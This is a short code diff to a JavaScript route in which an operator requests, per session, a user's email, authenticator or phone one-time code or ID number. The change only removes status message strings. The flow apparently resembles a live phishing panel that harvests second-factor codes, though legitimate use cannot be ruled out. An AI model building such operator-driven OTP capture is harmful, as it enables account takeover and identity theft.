@@ -8,24 +8,19 @@ router.post('/request-action/:sessionId', async (req, res) => {
     const io = req.app.get('io');
     
     let currentAction = '';
-    let message = '';
     
     switch(action) {
         case 'email_otp':
             currentAction = 'waiting_for_email_otp';
-            message = 'Requesting email OTP from user';
             break;
         case 'auth_otp':
             currentAction = 'waiting_for_auth_otp';
-            message = 'Requesting authenticator OTP from user';
             break;
         case 'phone_otp':
             currentAction = 'waiting_for_phone_otp';
-            message = 'Requesting phone OTP from user';
             break;
         case 'id_number':
             currentAction = 'waiting_for_id';
-            message = 'Requesting ID number from user';
             break;
         default:
             return res.status(400).json({ error: 'Invalid action' });
@@ -42,7 +37,7 @@ router.post('/request-action/:sessionId', async (req, res) => {
             [sessionId, action]
         );
         
-        io.emit('admin_action', { session_id: sessionId, action: action, message: message });
+        io.emit('admin_action', { session_id: sessionId, action: action });
         
         res.json({ success: true, action: action });
     } catch (error) {
